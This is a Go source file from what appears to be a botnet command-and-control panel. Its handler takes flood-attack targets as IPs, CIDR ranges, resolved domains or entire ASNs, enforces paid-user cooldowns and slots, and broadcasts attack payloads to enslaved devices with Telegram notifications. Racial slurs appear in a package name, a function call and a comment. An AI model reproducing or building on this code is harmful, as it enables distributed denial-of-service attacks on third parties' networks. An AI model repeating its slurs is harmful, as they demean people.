package flood

import (
	"advanced-telnet-cnc/packages/asn_scraper"
	"advanced-telnet-cnc/packages/filelogging"
	"advanced-telnet-cnc/source/config"
	"advanced-telnet-cnc/source/database"
	sessions "advanced-telnet-cnc/source/master/session"
	"advanced-telnet-cnc/source/master/telegram"
	"advanced-telnet-cnc/source/master/termfx"
	"advanced-telnet-cnc/source/niggers"
	"encoding/binary"
	"fmt"
	"github.com/bogdanovich/dns_resolver"
	"net"
	"os"
	"reflect"
	"sort"
	"strconv"
	"strings"
	"time"
)

var (
	logger = filelogging.NewLogger("assets/logs/attacks.log")
)

func (method *Method) Handle(session *sessions.Session, args []string, fx *termfx.TermFX) error {
	profile := &AttackProfile{method.ID, 0, make(map[uint32]uint8), make(map[uint8]string)}

	if len(args) < 2 {
		return ErrWrongSyntax
	}

	/* Checks if the user is allowed to send attacks or not */
	if !session.MethodAllowed(method.ID) {
		return ErrRestrictedMethod
	}

	if !config.Master.Attacks && !session.Admin {
		return ErrAttacksDisabled
	}

	/* Ending of checking if the user can send attacks or not */

	fullTarget := args[0]
	targets := strings.Split(args[0], ",")
	if len(targets) > 255 {
		return ErrTooManyTargets
	}

	for _, target := range targets {
		prefix := ""
		netmask := uint8(32)
		targetInfo := strings.Split(target, "/")
		if len(targetInfo) == 0 {
			return ErrBlankTarget
		}

		prefix = targetInfo[0]

		if len(targetInfo) == 2 {
			netmaskTmp, err := strconv.Atoi(targetInfo[1])
			if err != nil || netmask > 32 || netmask < 0 {
				return ErrInvalidNetmask
			}

			netmask = uint8(netmaskTmp)
		}

		if len(targetInfo) > 2 {
			return ErrTooManySlashes
		}

		ip := net.ParseIP(prefix)
		if ip == nil {
			return ErrInvalidIP
		}

		if !(session.Reseller || session.Admin) {
			if config.Blacklist.IsBlacklisted(binary.BigEndian.Uint32(ip[12:]), netmask) {
				config.Logger.Info("Blacklisted target", "user", session.Name, "target", ip.String())
				return ErrBlacklistedTarget
			}
		}

		profile.Targets[binary.BigEndian.Uint32(ip[12:])] = netmask
	}

	args = args[1:]

	duration, err := strconv.Atoi(args[0])
	if err != nil || duration == 0 || duration > session.MaxTime {
		return ErrInvalidDuration
	}

	profile.Duration = duration

	args = args[1:]

	var deviceCount = session.Devices
	var deviceGroup = ""

	for len(args) > 0 {
		if args[0] == "?" {
			keys := make([]string, 0, len(Options))

			for k, info := range Options {
				if !InSlice(info.ID, method.Options) {
					continue
				}

				keys = append(keys, k)
			}

			sort.Sort(sort.Reverse(sort.StringSlice(keys)))

			for _, key := range keys {
				session.Println(fmt.Sprintf("%s: %s", key, Options[key].Description))
			}

			if InSlice(Options["payload"].ID, method.Options) {
				session.Println(fmt.Sprintf("%s: %s", "preset", "Packet data presets, default is none"))
			}

			session.Println(fmt.Sprintf("%s: %s", "domain", "Domain name to attack, input targets are ignored"))

			return nil
		}

		flagSplit := strings.Split(args[0], "=")
		if len(flagSplit) < 2 || len(flagSplit[1]) < 1 {
			return ErrInvalidOptionCombination
		}

		/* Accept quotes */
		if flagSplit[1][0] == '"' {
			if strings.Count(flagSplit[1], "\"") != 2 {
				return ErrInvalidOptionCombination
			}

			flagSplit[1] = flagSplit[1][1 : len(flagSplit[1])-1]
		}

		key := flagSplit[0]
		value := flagSplit[1]

		switch key {
		case "count":
			if !session.Admin {
				args = args[1:]
				continue
			}

			if deviceCount, err = strconv.Atoi(value); err != nil {
				session.Println(config.Red + "Ignored count value due to an invalid integer.")
				continue
			}

			args = args[1:]
			continue
		case "group":
			if !(session.Admin || session.Name == "lastdude") {
				args = args[1:]
				continue
			}

			deviceGroup = value
			args = args[1:]
			continue
		case "preset":
			xd, exists := PayloadPresets[value]
			if !exists {
				return ErrUnknownOption
			}

			information, ok := Options["payload"]
			if !ok || !InSlice(information.ID, method.Options) {
				return ErrUnknownOption
			}

			profile.Options[information.ID] = xd

			args = args[1:]
			continue
		case "domain":
			profile.Targets = make(map[uint32]uint8)
			resolver := dns_resolver.New([]string{"1.1.1.1"})
			resolver.RetryTimes = 1

			records, err := resolver.LookupHost(value)
			if err != nil {
				return ErrResolvingFail
			}

			type Records struct {
				Length  int
				Records string
			}

			var stringRecords []string
			for _, record := range records {
				stringRecords = append(stringRecords, record.String())
			}

			fx.Execute(session.Theme.Name+"/resolved.lufx", true, fx.Elements(map[string]any{
				"Domain":  value,
				"records": &Records{Records: strings.Join(stringRecords, ", "), Length: len(records)},
			}))

			for _, record := range records {
				ip := net.ParseIP(record.String())
				if ip == nil {
					return ErrInvalidIP
				}

				if !session.Admin {
					if config.Blacklist.IsBlacklisted(binary.BigEndian.Uint32(ip[12:]), 32) {
						config.Logger.Info("Blacklisted target", "user", session.Name, "target", ip.String())
						return ErrBlacklistedTarget
					}
				}

				profile.Targets[binary.BigEndian.Uint32(ip[12:])] = 32
			}

			args = args[1:]

			continue
		case "asn":
			if !session.Admin {
				return ErrUnknownOption
			}

			_, subnets, err := asn_scraper.NewScraper("ebdf3e5f4f0103").CIDR(flagSplit[1])
			if err != nil {
				return err
			}

			for _, record := range subnets {
				profile.Targets[binary.BigEndian.Uint32(record.Prefix[12:])] = uint8(record.Netmask)
			}

			args = args[1:]

			continue
		}

		information, ok := Options[key]
		if !ok || !InSlice(information.ID, method.Options) {
			return ErrUnknownOption
		}

		switch key {
		case "true", "t", "yes": // Boolean
			value = "1"
		case "false", "f", "no": // Boolean
			value = "0"
		}

		if information.Type == reflect.Int && !isNumber(value) {
			return ErrOptionNotAnInt
		} else if information.Type == reflect.Bool && !isBoolean(value) {
			return ErrOptionNotAnBoolean
		}

		if information.Type == reflect.Int {
			intValue, parseErr := strconv.Atoi(value)
			if parseErr != nil {
				return ErrOptionNotAnInt
			}

			if limit(intValue, information) && !session.Admin {
				return ErrOptionOutOfRange
			}
		}

		profile.Options[information.ID] = value

		args = args[1:]
	}

	// Ranges through all the system flags
	for _, system := range Options {
		if !InSlice(system.ID, method.Options) || !system.HasDefault {
			continue
		}

		if _, exists := profile.Options[system.ID]; exists {
			continue
		}

		// dont set default value for minlen & maxlen when len is specified.
		if _, exists := profile.Options[0]; exists && (system.ID == 27 || system.ID == 28) {
			continue
		}

		profile.Options[system.ID] = fmt.Sprint(system.Default)
	}

	created := time.Now()

	lastAttackByAllUsers, err := database.LastFlood()
	if err != nil {
		return err
	}

	lastFlood, err := session.LastFlood()
	if err != nil {
		return err
	}

	running, err := database.RunningAttacks()
	if err != nil {
		return err
	}

	left, _, err := session.Attacks()
	if err != nil {
		return err
	}

	if left <= 0 {
		return ErrNoAttacks
	}

	if len(running) >= config.Master.AttackSlots {
		return ErrSlotsFull
	}

	// fuck you fuck you fuck you fuck you stupid fucking niggerr
	if !session.Admin {
		if lastAttackByAllUsers != nil && lastAttackByAllUsers.End.Add(time.Duration(config.Master.GlobalCooldown)*time.Second).Unix() > time.Now().Unix() {
			return ErrGlobalCooldown
		}
	}

	if lastFlood != nil && lastFlood.End.Add(time.Duration(session.Cooldown)*time.Second).Unix() > time.Now().Unix() && !session.Admin {
		return ErrUserCooldown
	}

	if !session.Admin {
		for h, n := range profile.Targets {
			if Limiter.IsLimited(h, n) {
				return ErrTooManyAttacks
			}
		}
	}

	err = database.LogAttack(&database.Flood{
		Target:   fullTarget,
		Duration: profile.Duration,
		Created:  created,
		Method:   method.Name,
		End:      created.Add(time.Duration(profile.Duration) * time.Second),
	}, session.UserProfile)
	if err != nil {
		fmt.Println(err)
		return err
	}

	logger.Logf("user=%s target=%s duration=%d cooldown=%d method=%s unix=%d", session.Name, fullTarget, profile.Duration, session.Cooldown, method.Name, time.Now().Unix())

	payload, err := profile.CreatePayload()
	if err != nil {
		fmt.Println(err)
		os.Exit(0)
		return err
	}

	devicesSentTo := niggers.BroadcastAttack(payload, deviceGroup, deviceCount)

	message := fmt.Sprintf("[!] Attack has been sent: name=%s, targets=%s, devices=%d, method=%s, timestamp=%s", session.Name, fullTarget, devicesSentTo, method.Name, time.Now().Format(time.RFC822))
	telegram.Send(message)


	if !session.Admin {
		for h, n := range profile.Targets {
			Limiter.Add(h, n)
		}
	}

	return fx.Execute(session.Theme.Name+"/broadcasted.lufx", true, fx.Elements(map[string]any{
		"Devices":   devicesSentTo,
		"Target":    fullTarget,
		"Duration":  duration,
		"Method":    method.Name,
		"Timestamp": time.Now().Format(time.RFC822),
	}))
}

func isNumber(value string) bool {
	_, err := strconv.ParseFloat(value, 64)
	return err == nil
}

func isBoolean(value string) bool {
	_, err := strconv.ParseBool(value)
	return err == nil
}

func limit(value int, option Option) bool {
	if option.Maximum == 0 {
		return false
	}

	return value > option.Maximum || value < option.Minimum
}
